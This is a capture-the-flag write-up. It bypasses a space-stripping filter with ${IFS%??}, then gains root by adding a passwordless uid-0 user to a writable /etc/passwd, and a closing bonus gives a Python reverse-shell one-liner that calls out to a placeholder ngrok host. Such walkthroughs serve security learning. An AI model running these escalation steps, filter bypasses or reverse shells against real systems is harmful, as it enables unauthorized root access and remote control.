
# The Spaces Between Us

It seems like our commands are getting spaces stripped out. This can be fixed by using `${IFS%??}` instead of spaces:
```
←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$ ls${IFS%??}-alh
total 28K
dr-xr-xr-x 1 user user 4.0K Dec 11 19:23 .
drwxr-xr-x 1 root root 4.0K Dec 11 19:23 ..
-rw-r--r-- 1 user user  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 user user 3.5K Mar 27  2022 .bashrc
-rw-r--r-- 1 user user  807 Mar 27  2022 .profile
-r-xr-xr-x 1 root root 1.9K Dec 11 19:22 .server.py
-rw-r--r-- 1 root root  174 Dec 11 19:22 README.md

←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$ cat${IFS%??}README.md
Your objective to escalate your privileges
and retrieve the flag in /root/flag.txt.

If you look around the filesystem, you may
find some odd permissions you can leverage :)
```

`.server.py` looks interesting, but the README has a pretty clear hint to look for "odd" permissions. Lets use `find` to do that using `find / -writable` (also passed in grep/head for brevity):
```
←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$ find${IFS%??}/${IFS%??}-writable${IFS%??}|${IFS%??}grep${IFS%??}-Ev${IFS%??}proc${IFS%??}|head${IFS%??}-n${IFS%??}10
find: ΓÇÿ/proc/tty/driverΓÇÖ: Permission denied
find: ΓÇÿ/etc/ssl/privateΓÇÖ: Permission denied
find: ΓÇÿ/rootΓÇÖ: Permission denied
find: ΓÇÿ/var/cache/ldconfigΓÇÖ: Permission denied
find: ΓÇÿ/var/cache/apt/archives/partialΓÇÖ: Permission denied
find: ΓÇÿ/var/lib/apt/lists/partialΓÇÖ: Permission denied
/etc/passwd
/tmp
/dev/core
```

`/etc/passwd` huh? That's fun. Lets abuse that:

Create a new user without a password, set uid/gid to 0, add to root user group:
```
←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$ echo${IFS%??}"user2::0:0:root:/root:/bin/bash"${IFS%??}>>${IFS%??}/etc/passwd
/bin/sh: 1: cannot create  /etc/passwd: Directory nonexistent
```
It's not letting me edit it directly, so used this trick instead -- copy to /tmp, edit there, cat back over:
```
←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$ cp${IFS%??}/etc/passwd${IFS%??}/tmp/
echo${IFS%??}"user2::0:0:root:/root:/bin/bash"${IFS%??}>>${IFS%??}/tmp/passwd
cat${IFS%??}/tmp/passwd${IFS%??}>/etc/passwd
```

Validate our new user is correctly in place without password:
```
←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$ cat${IFS%??}/etc/passwd
root:x:0:0:root:/root:/bin/bash
<SNIP>
user2::0:0:root:/root:/bin/bash
```

Use typical `su - user2` to leverage new user, doesn't seem to work -- however `su -c` works:
```
←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$ su${IFS%??}-${IFS%??}user2

←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$

←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$ su${IFS%??}-c${IFS%??}'id'${IFS%??}user2
uid=0(root) gid=0(root) groups=0(root)
```

Now that we can use it, lets grab flag from `/root`:
```
←[32m←[1muser@challenge←[39m←[22m:←[36m←[1m~←[39m←[22m$ su${IFS%??}-c${IFS%??}'ls${IFS%??}-alh${IFS%??}/root${IFS%??}&&${IFS%??}cat${IFS%??}/root/*flag*'${IFS%??}user2
total 28K
drwx------ 1 root root 4.0K Dec 11 19:23 .
drwxr-xr-x 1 root root 4.0K Dec 17 21:44 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x 3 root root 4.0K Dec 11 19:23 .cache
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw------- 1 root root    0 Dec  8 00:01 .python_history
-rw-r--r-- 1 root root  254 Dec  8 00:08 .wget-hsts
---------- 1 root root   39 Dec 11 19:22 flag.txt
flag{59af40c07bc6f02b457aa4c15543da2d}
```

## Bonus
To make life easier, you can also use ngrok/netcat to create a reverse shell, this way no need to deal with annoying spaces, etc. The container has python, so you can use something like this:
`python -c 'socket=import("socket");subprocess=import("subprocess");os=import("os");pty=import("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("NGROK-HOST",NGROK-PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

Reference: https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9, https://cheatsheet.haax.fr/shells-methods/reverse/
